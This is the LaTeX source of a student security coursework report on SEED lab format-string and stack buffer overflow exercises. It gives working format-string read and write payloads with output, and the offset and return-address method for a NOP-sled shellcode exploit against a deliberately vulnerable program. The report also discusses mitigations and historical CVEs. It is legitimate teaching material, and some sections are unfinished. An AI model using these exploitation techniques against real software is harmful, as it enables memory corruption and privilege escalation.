\documentclass[12pt, onecolumn]{IEEEtran}

\usepackage[margin=25mm]{geometry}
\newcommand\tab[1][1cm]{\hspace*{#1}}
\setlength{\parindent}{0pt}

%break url line in references
\usepackage[hyphens]{url}
\usepackage{hyperref}
\hypersetup{breaklinks=true}
\urlstyle{same}

\usepackage{cite}

\usepackage{array}

\hyphenation{op-tical net-works semi-conduc-tor intro-duction high-light}

\begin{document}

COMSM1500 (Systems Security)\\
Coursework 1\\
\\
Students: cy13308 and rz13310 \\
\\
Contribution: \\
\tab[1cm] cy13308: set up own VM; completed task 1, attempted task 2, report on task 1\\
\tab[1cm] rz13310: set up own VM; attempted task 1, fixed and finished task 2, report on task 2
\\
\\
Overal contribution: cy13308 50\%, rz13310 50\%
\newpage

\section{Overview}
%One page intro/overview here explaining what this report contains, briefly describe procedures (SEED VM etc) and our conclusion
This coursework investigates two basic yet powerful vulnerabilities: format strings and buffer over- flow. In the upcoming experiments, the SEED labs virtual machine is used. We target audiences who have some programming experience in C and a basic understanding about memory layouts. Required source code files should be found in \\
https://www.cs.bris.ac.uk/Teaching/Resources/COMSM1500/.

In each technical report, we first introduce the problem at hand by providing the context. Then, we illustrate how the respective mechanisms break down in under certain circumstances. We proceed to exploit these vulnerabilities and finally, reflect on the bigger picture.
\newpage

\section{Lab 1}
\subsection{Technical Report}
% A technical part, describing what you did and how/why it works. Imagine that you are writing for another student who has not taken this unit: they should be able, after reading your technical part, to both reproduce your attacks by following the steps you give and to have a basic understanding of what is happening.

\subsection{Context}
In the C language, format strings provide a way of combining string literals with zero or more other types of data. The following is a subset of the format string substitutions that are important to this exercise:

\begin{minipage}{\linewidth}
\begin{lstlisting}[caption={Format string substitutions},
language=,
frame=single]
%d                  Signed integer
%s                  Null-terminated string
%x                  Signed integer in hexadecimal form
%p                  Address in hexadecimal form
%n                  Number of bytes printed up to this token
%<index>$<type>     Indexed substitution form
\end{lstlisting}
\end{minipage}

The \emph{\%n} token is special, because it writes to its corresponding parameter by treating it as a pointer. On the other hand, the indexed substitution form is useful either to refer to the same substitution variable multiple times, or to skip having to repeat the same token many times. For more details about the \emph{printf()} family of functions, the reader is referred to \cite{printf3}.

In this Lab we focus on the misuse of the \emph{printf()}, whereby a user-entered string is passed as the format string. Such mistake allows the user to control substitution tokens in ways that can violate the actual number of substitution variables supplied. This vulnerability was intentionally created in \emph{formatstring.c}:

\begin{minipage}{\linewidth}
\begin{lstlisting}[caption={Vulnerable part in formatstring.c},
label={lst:l1_pa_ex},
frame=single]
char user_input[100];
...
scanf("%s", user_input);
printf(user_input);
\end{lstlisting}
\end{minipage}

If the user enters a valid format string, it will be faithfully parsed by \emph{printf()} even though no substitution variables were supplied. This means that instead of  stopping when there are no more substitution variables to consume, \emph{printf()} continues accessing stack data until all tokens are respected.

In the following sections, we use \emph{formatstring.c} to demonstrate how the format string vulnerability can lead to leakage and overwrite of important data. \emph{formatstr-root} is the set-uid version of \emph{formatstring}. This document also comes with two auto-exploit scripts written in Python: \emph{cwk1\_p1.py}, and \emph{cwk1\_p2.py}.2.

\subsection{Task 1}
\subsubsection{Part (a) Crash the Program}
In order to consistently crash the program, we first inspect the stack so as to gather information that we might leverage. To understand how this was possible, the call stack structure is illustrated:

\begin{minipage}{\linewidth}
\begin{lstlisting}[caption={Stack frame illustration},
language=,
label={lst:l1_pa_stack},
frame=single]
...
main()  |    Local variables of main()
        |    Saved registers of main()
        |    Argument #N for printf()
        |    Argument... for printf()
        |    Argument #2 for printf()
        |    Argument #1 for printf()
        printf()    |    Return address to main()
                    |    Stack frame address of main()
                    |    Local variables of printf()
                    |    ...(stack grows downwards)
\end{lstlisting}
\end{minipage}

The stack structure in \lstref{lst:l1_pa_stack} suggests that reading past (above) the argument list would expose saved register values of the caller. We test this by running \emph{formatstr-root} and entering "\%x,\%x". Note that at this stage, the choice of the integer input does not matter. The execution results in two values being printed off the stack: \emph{bf978d88} and \emph{1}. The first value appears to be some address, while the second value seems to remain the same in every run. We then use the \emph{\%s} token to interpret the second value as an address, generating a segmentation fault (addresses near 0 are almost never accessible). The full payload is "\%2\$s", which translates into "treat the second argument as a char pointer, dereference it, and then display it".

\begin{minipage}{\linewidth}
\begin{lstlisting}[caption={De-referencing invalid address},
frame=single]
...
Please enter a string
%2$s
Segmentation fault (core dumped)
\end{lstlisting}
\end{minipage}

\subsubsection{Part (b) Print out the value of secret[1]}
Since the data pointed to by \emph{secret} is allocated on the heap, an indirection (i.e. de-referencing) is required for its access. The heap address itself thus needs to be written somewhere. This time, the integer input becomes useful.

We approach this attack by firstly locating the stack position or the \emph{argument index} of the integer input. This was achieved by entering arbitrarily many \emph{\%d} tokens with an easily identifiable integer input value. \lstref{lst:l1_pb_argind} shows that our integer input \emph{13371337} took the stack position of 9.

From now on, we can simply enter the address of secret[1] in decimal as the integer input, and then access it via \emph{"\%9\$.1s"}. This payload translates to: "treat the ninth argument as a char pointer, dereference it, and then display the first character". To read out the four byte value of \emph{secret[1]}, we send the payload four times (read one byte at a time), each time incrementing one byte from its base address. This process is shown in \lstref{lst:l1_pb_o1} and \lstref{lst:l1_pb_o2}. We chose to read the value of secret[1] byte-by-byte because the simple \emph{\%s} token has the danger of interpreting non null-terminated data that might overun readable address and cause a segmentation fault.

\begin{minipage}{\linewidth}
\begin{lstlisting}[caption={Locating integer input},
label={lst:l1_pb_argind},
language=,
frame=single]
...
Please enter a decimal integer
13371337
Please enter a string
%d,%d,%d,%d,%d,%d,%d,%d,%d,%d
-1075410664,1,-1218346231,-1075410625,-1075410626,0,-1075410396,
134914056,13371337,623666213
...
\end{lstlisting}
\end{minipage}

\begin{minipage}[t]{.48\textwidth}
\begin{lstlisting}[caption={Printing out secret{$[1]$} bytes 0 and 1},
label={lst:l1_pb_o1},
language=,
frame=single]
... address is 0x 8ffd00c
Please enter a decimal integer
150982668
Please enter a string
%9$.1s
U
...
... address is 0x 9ab700c
Please enter a decimal integer
150982668
Please enter a string
%9$.1s

...
\end{lstlisting}
\end{minipage}
\hfill
\begin{minipage}[t]{.48\textwidth}
\begin{lstlisting}[caption={Printing out secret{$[1]$} bytes 2 and 3},
label={lst:l1_pb_o2},
language=,
frame=single]
... address is 0x 8b8a00c
Please enter a decimal integer
146317326
Please enter a string
%9$.1s

...
... address is 0x 86ae00c
Please enter a decimal integer
141221904
Please enter a string
%9$.1s

...
\end{lstlisting}
\end{minipage}

The single character outputs from \lstref{lst:l1_pb_o1} and \lstref{lst:l1_pb_o2} are "\emph{U}", "\emph{(nothing)}", "\emph{(nothing)}", and "\emph{(nothing)}". By converting to ASCII codes and reversing the little-endian order, we arrive at \emph{0x55}, which matches the true value of secret[1].

\subsubsection{Part (c) Modify the value of secret[1]}
To modify secret[1], the \emph{\%n} token becomes crucial. Using the same integer input addressing method discussed in part (b), we construct the payload: "\%9\$n". This payload translates to: "treat the ninth argument as an integer address, dereference it, and then write zero into it". This payload sets secret[1] to zero because the payload itself led to no bytes being printed, and the ninth argument was set to the address of secret[1] by the integer input. \lstref{lst:l1_pc_o} illustrates the use of this payload.

\subsubsection{Part (d) Set secret[1] to a specific value}
Building on top of part (c), we gain the ability to set any pointed heap variable to almost any value with the payload "\%$<$val$>$.0s\$9n". The format syntax of this payload tells \emph{printf()} to produce $<$val$>$ number of white spaces, and then print zero characters from whichever string argument it is referencing to. The payload was used to set secret[1] to \emph{0x77} in \lstref{lst:l1_pd_o}.

\begin{minipage}{\linewidth}
\begin{lstlisting}[caption={Setting secret{$[1]$} to 0},
label={lst:l1_pc_o},
language=,
frame=single]
...
secret[1]'s address is 0x 9a6700c (on heap)
Please enter a decimal integer
161902604
Please enter a string
%9$n

The original secrets: 0x44 -- 0x55
The new secrets:      0x44 -- 0x0
\end{lstlisting}
\end{minipage}

\begin{minipage}{\linewidth}
\begin{lstlisting}[caption={Setting secret{$[1]$} to 0x77},
label={lst:l1_pd_o},
language=,
frame=single]
...
secret[1]'s address is 0x 996700c (on heap)
Please enter a decimal integer
160854028
Please enter a string
%119.0s%9$n

The original secrets: 0x44 -- 0x55
The new secrets:      0x44 -- 0x77
\end{lstlisting}
\end{minipage}

\subsection{Task 2}
In Task 2, \emph{formatstring.c} is stripped of the integer input. This effectively forbids the setting of the address as practiced in Task 1, and left the format string to be the only interaction with the program. While this does not affect the payload used to crash the program, parts (b), (c), and (d) require a new method of getting an address to secret[1].

Since the \emph{user\_input} char array is on the stack, it should be possible to access it via an indexed substitution token. In \lstref{lst:l1_t2_insp}, we inspected the stack again and found that \emph{user\_input} was the tenth argument ("RIPP" translates to 0x50504952 in hex).

After locating the "scratch pad" argument, we converted the address of secret[1] to escaped bytes and embeded them in the format string in little-endian order. \lstref{lst:l1_t2_le_pb} demonstrates this, along with the payload that printed out the first character of the pointed address. The result is the same as Task 1: 'U' (=\emph{0x55}). Other bytes are read by repeating the process with different offsets; their outputs are ommitted here since they are all null.

Finally, after applying the same technique to create the address of secret[1] in the first four bytes of \emph{user\_input}, the second half of the payload used in Task 1 part (d) can be reused. Parts (c) and (d) are achieved as shown in \lstref{lst:l1_t2_le_pcd}.

\begin{minipage}{\linewidth}
\begin{lstlisting}[caption={Stack inspection to find the start of user\_input},
label={lst:l1_t2_insp},
language=,
frame=single]
...
Please enter a string
RIPPAAAA,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p
RIPPAAAA,0xbffff678,0x8,0xb7eb8309,0xbffff69f,0xbffff69e,
(nil),0xbffff784,0xbffff724,0x804b020,0x50504952,0x41414141,
0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c702
...
\end{lstlisting}
\end{minipage}

\begin{minipage}{\linewidth}
\begin{lstlisting}[caption={Little-endian conversion and reading one byte},
label={lst:l1_t2_le_pb},
language=,
frame=single]
...
secret[1]'s address is 0x 804b024 (on heap)
Please enter a string
\x24\xb0\x04\x08<%10$.1s>
$<U>
...
\end{lstlisting}
\end{minipage}

\begin{minipage}{\linewidth}
\begin{lstlisting}[caption={Writing value 0xde to secret{$[1]$}},
label={lst:l1_t2_le_pcd},
language=,
frame=single]
...
secret[1]'s address is 0x 804b024 (on heap)
Please enter a string
\x24\xb0\x04\x08%218.0s%10$n
$
The original secrets: 0x44 -- 0x55
The new secrets:      0x44 -- 0xde
\end{lstlisting}
\end{minipage}

\subsection{Task 3}
\subsubsection{Part (a) Redo Task 2 with ASLR turned on}
When ASLR is turned on, we see that the payloads documented in Task 2 fail about half of the time. After some analysis, we identified that some bytes were not being delivered properly to the memory as raw bytes. For example, \emph{0x09} (tab, or '{\textbackslash}t'), gets interpreted and removed by \emph{printf()} and does not set the memory correctly. These "bad bytes" from ASLR's address randomisation seem to be the culprit causing the payload failures.

To circumvent this, we dropped the byte escaping method and attempted to set the address using the "space-generator" payload, "\%$<$val$>$.0s", followed by a \emph{\%n}. Unfortunately, this took way too long as the terminal kept on printing spaces to the size of the target address (hundreds of millions). Futher constraints in time meant that we were unable to find a complete solution on this part.

\subsubsection{Part (b) Automate Task 2 (b)}
As mentioned earlier, this document comes with two solution files written in Python: \emph{cwk1\_p1.py} and \emph{cwk1\_p2.py}. Each of them automatically execute all of the exploits in Task 1 and Task 2 respectively. The code uses \emph{pexpect}. It parses the addresses printed by \emph{formatstring} and automatically re-establishes the correct "scratch pad" argument.
\newpage
\subsection{Reflective Report}
% A reflective part, in which you critically reflect on the circumstances (both technical and organisational) that can give rise to the relevant vulnerabilities and potential mitigations. This can include e.g. mention of real instances of these attacks that you have researched, comparison to other attacks, discussion of relevant standards and recommendations (CERT, OWASP etc.). You can also discuss topics relating to the vulnerablities that you exploited, including: their potential risk and impact in real systems; why they (still) exist; which straightforward attempts at mitigation do not work and why not; how you would sucessfully reduce or eliminate these vulnerabilities.

%Cite occurences that brought people's attention to the exploit
Format string bugs were first reported in 1989 \cite{Miller1990} and gained more public attention a decade after when a security audit of the ProFTPD daemon unveiled the vulnerability \cite{tymm1999}. Today, it has been widely documented \cite{fsa_owasp, Weitz2014, arbaugh1997automated, scut2001}, with numerous protection techniques proposed, such as \cite{Shankar2001, cowan2002}. The Common Weakness Enumeration (CWE) dictionary keeps six records of real incidents where format strings were exploited \cite{fsa_cwe}, while Kilic et al counted around a dozen per year up to 2013 \cite{Kilic2015}. The CWE rates this exploit as very high likelihood, with common consequences of confidentiality loss and arbitrary code execution. These are serious impacts to system security considering that so many programs are written C and C++, which are quoted as \emph{often} suffering from format string attacks \cite{fsa_cwe}.

In this Lab, we have investigated the technical aspect that enables format string attacks to still be viable, albeit with some help to discover our address of interest. Although we have only shown the writing and reading of memory addresses, more sophisticated attacks are possible through meticulously crafted attacks. For example, arbitrary code execution and privilege escalation can be achieved by writing shell code onto the stack. One such incident is the CVE-2002-0573, whereby a call to the syslog function with user input allowed the execution of shell code in the RPC wall daemon for Solaris 2.5.1 through 8 \cite{cve-solaris2002}. Other cases include format strings taking down Splinter Cell gaming servers \cite{Auriemma} and Windows FTP server sin 2004 \cite{Winter-Smith2004}.

Fortunately, the No-eXecution (NX) memory protection was able to greatly thwart such efforts, and was popularized circa 2004. Today, most operating systems have ASLR and NX turned on by default, which makes address disclosure more difficult. We observed in Task 3 that in order to cope with changing addresses, more advanced techniques were required to insert the address bytes. Furthermore, performing the exploit manually became impractical as the addresses change in each execution. According to CWE, format string vulnerabilities have become rare today because of the ease of detection and the fact that the misuse of the \emph{printf()} family is now uncommon \cite{fsa_cwe}.

In the bigger picture, the format string attack is somewhat similar to SQL injection, whereby unsanitized input gets interpreted as part of the command. The SQL injection has been eliminated altogether by using parameterised statements. An approach to achieve something similar in general-purpose programming languages would be to restrict format strings to compile-time constant values, and only allow variable strings after the first argument. Moreover, since the \emph{printf()} family of functions are well known and rather static in nature, compilers could enforce a failure when substitution tokens and substitution variables mismatch (i.e. perform compile time lexical analysis \cite{alanpscan}). Another method is to implement type-checking as suggested by \cite{Weitz2014}. Although these methods slightly reduce programming freedom (e.g. no overloading of \emph{printf()} with single argument), the gain in security is well worth it.

On the other hand, good coding practice should be propagated from an early stage in educating programmers. It appears that most formal education skip the details on such "mundane" programming utilities. It would go a long way with a simple demonstration that \emph{printf(input)} is exploitable, while \emph{printf("\%s", input)} is not.The Computer Emergency Response Team (CERT) for the Software Engineering Institute (SEI) recommands to "never call a formatted I/O function with a format string containing a tainted value" \cite{burch_cert}, with very detailed examples of standard and poor practices. Tainted value here refers to any data source that is not sanitized. It should be noted that the non-trivial process of string sanitization and its lack of reliability mean that passing sanitized user input directly as the format string is still not recommendable.
\newpage

\section{Lab 2}
\subsection{Technical Report}
% A technical part, describing what you did and how/why it works. Imagine that you are writing for another student who has not taken this unit: they should be able, after reading your technical part, to both reproduce your attacks by following the steps you give and to have a basic understanding of what is happening.

%short intro on format strings

%what could go wrong

%what we did

%how/why did what we did work
\fakesection{Buffer overflow exploit}
The first task of the second lab ask us to exploit the buffer overflow of function \emph{bof} in the provided vulnerable program. This is a classic technique of overrunning a local buffer in a function stack frame to overwrite the saved return address. When the function eventually tries to return the execution flow is diverted to the overwritten address which could allow an attacker to execute arbitrary code with the privileges  of the exploited process.

To create this exploit our first goal was finding the offset in our input that overwrites \emph{bof}'s return address. This means finding the beginning of the overflown buffer in relation to the function's stack frame. By disassembling the \emph{stack-root} program we find in instruction 6 that this is \emph{-0x20(\%ebp)} or 32 byte before \emph{\%ebp}. This instruction sets the buffer address as an argument to \emph{strcpy()}. After these 32 bytes the stack frame contains 4 bytes of the saved \emph{\%ebp} followed by 4 bytes of the return address.

\vgap\begin{lstlisting}[frame=single]
08048484 <bof>:
8048484:	55                   	push   %ebp
8048485:	89 e5                	mov    %esp,%ebp
8048487:	83 ec 38             	sub    $0x38,%esp
804848a:	8b 45 08             	mov    0x8(%ebp),%eax
804848d:	89 44 24 04          	mov    %eax,0x4(%esp)
8048491:	8d 45 e0             	lea    -0x20(%ebp),%eax
8048494:	89 04 24             	mov    %eax,(%esp)
8048497:	e8 e4 fe ff ff       	call   8048380 <strcpy@plt>
804849c:	b8 01 00 00 00       	mov    $0x1,%eax
80484a1:	c9                   	leave
80484a2:	c3                   	ret
\end{lstlisting}

We make an exploit that consists of 36 junk bytes 0xAA followed by the target address in little-endian followed by the 24 bytes of provided shellcode. For successful execution the target address needs to point at the beginning of the shellcode. We find this address by executing the \emph{stack-root} program in \emph{gdb} and setting the \emph{ret} instruction of \emph{bof} as a breakpoint. We take note of \emph{\%esp} which in our build is \emph{0xBFFFF4BC}. At that instruction \emph{\%esp} would point to the return address on the stack and if the shellcode is located just after that return address, a pointer to it would be 4 bytes higher than the obtained value - \emph{0xBFFFF4C0}. Using that as our target return address we successfully execute the exploit in \emph{gdb}. Since running the program outside \emph{gdb} the stack has a slight offset this exploit fails. To make our exploit resistant to stack offset variations we prepend the shellcode with 256 bytes of \emph{nop} instructions and increment the return address by 128 setting it to \emph{0xBFFFF540}. This gives the exploit operability when the stack offset is within 128 bytes of the stack offset under \emph{gdb}.

\fakesection{Defence mechanisms}
The first defence technique to consider against this exploit is Address Space Layout Randomization or ASLR. This is an Operating System security feature implemented by the program loader that randomises the allocations for the heap, stack and loaded libraries. It does not prevent the actual buffer overflow but can mitigate it's exploitation potential. Since the crafted exploit needs to know the approximate location of the shellcode and that is located on the now randomised stack. With ASLR we can no longer obtain the stack location through seeing the memory maps of a single program instance because different executions allocate the stack at random location. By trying enough times it is possible to get successful exploitation if the random stack coincides with the observed stack location on creating the exploit. This is more likely to be feasible on 32-bit environments as they only offer 16 bits of randomisation which is significantly smaller than the available randomisation on 64-bit platforms. However there exist several methods to bypass this protection. A popular one is using the executable code and global variable space  which is the remaining known data fixed in the executable's address space. This is a very powerful technique but can be preventing by adopting compilation of position independent code (PIC). With PIC even the executable code's addresses can be randomised. This leaves the attacker only with finding an address leak as a viable attack on ASLR. If however such an information leak exists then it renders ASLR completely ineffective as the attacker can compute the exact offset of the leaked segment.\\
\tab Stack Protector \cite{Stackgua58} \\
\newpage
\subsection{Reflective Report}
% A reflective part, in which you critically reflect on the circumstances (both technical and organisational) that can give rise to the relevant vulnerabilities and potential mitigations. This can include e.g. mention of real instances of these attacks that you have researched, comparison to other attacks, discussion of relevant standards and recommendations (CERT, OWASP etc.). You can also discuss topics relating to the vulnerablities that you exploited, including: their potential risk and impact in real systems; why they (still) exist; which straightforward attempts at mitigation do not work and why not; how you would sucessfully reduce or eliminate these vulnerabilities.

%Is this exploit still relevant today and why/why not?
%Cite occurences that brought people's attention to the exploit

%Are there new problems relating to this exploit today?
%Cite potential risks to real systems and what can be done about it

%Introduce related vulnerabilities or variants for research points

%Finally, close with best practices to mitigate the vulnerability
%Explain a simple method that doesn't work perfectly
%Explain a standard way to eliminate/minimise the risk of the vulnerability

Buffer Overflow vulnerabilities are some of the most dangerous security risks. The Open Web Application Security Project \cite{owasp} treats them as very high severity at high likelihood of exploit. At minimum such vulnerabilities can result is software crashes and denial of service attacks. Their very high severity comes when a buffer overflow vulnerability results in arbitrary code execution. This can subvert any security measure and can compromise the entire computer that is executing the vulnerable software. Thankfully this vulnerability is eliminated by higher level languages that do not allow direct memory access and enforce array boundary checking. This means that much of software running on personal computers can easily eliminate the risk of this vulnerability. However system or high-performance software that rely on the features of programming in C/C++ or Assembly would still be exposed to the risk. \\ \\
The Blaster Worm\cite{balster_cert} is a good example of the severity of buffer overflows. It garnered media attention in 2003 as it was able to quickly spread throughout the internet without user interaction. The worm used a buffer overflow in Microsoft's RPC protocol to compromise machines. It demonstrates the power of remote code execution that results from exploiting buffer overflows. From taking a historic look into attacks using this threat it can be noted that buffer overflows were significantly more prevalent before the introduction of Windows Vista that includes bot ASLR and non-executable stack as standard mitigation security features. Nevertheless buffer overflows can still be taken advantage of especially in the sphere of embedded and Internet of Things devices. Those computer systems are usually limited in function and require the use of the C/C++ programming languages. In addition consumer focused devices target short time to market deadlines that put pressure on the software developers and heighten the probability of introducing vulnerabilities. \\ \\
From the investigation of the available defences against buffer overflows it can be noted that the possibility of exploitation can be significantly reduced by employing all available defences, but it does not completely eliminate the risk. If a system uses a position independent executable with ASLR in 64-bit addressing with non-executable stack and stack guards successful exploitation would likely be dependent on multiple vulnerabilities in the software. The best available solution to buffer overflows would be to use a managed programming language that eliminates the vulnerability. If a low-level language is required however this threat is likely impossible to eliminate. Defences against the vulnerability only mitigate risk of exploitation to reduce the likelihood of the vulnerability software development procedures must be implemented by the creator of the software. While automatic checking for known "bad" functions like \emph{strcpy} can be used to prevent the most basic buffer overflows, this vulnerability type is often hard to detect. Code review and security training should be required when working with programming languages that have potential to introduce buffer overflows. Even so the possibility of introducing a vulnerability or having a library dependency with a buffer overflow can not be completely eliminated. The severity of exploiting this vulnerability can be significant enough for software designers to consider automated patching functionality even with low likelihood of having a buffer overflow.

%end

% \appendices
% \section{Proof of the First Zonklar Equation}
% Appendix one text goes here.

% you can choose not to have a title for an appendix
% if you want by leaving the argument blank
% \section{}
% Appendix two text goes here.

% \bibliographystyle{IEEEtran}
% \bibliography{mendeley_library}
\end{document}

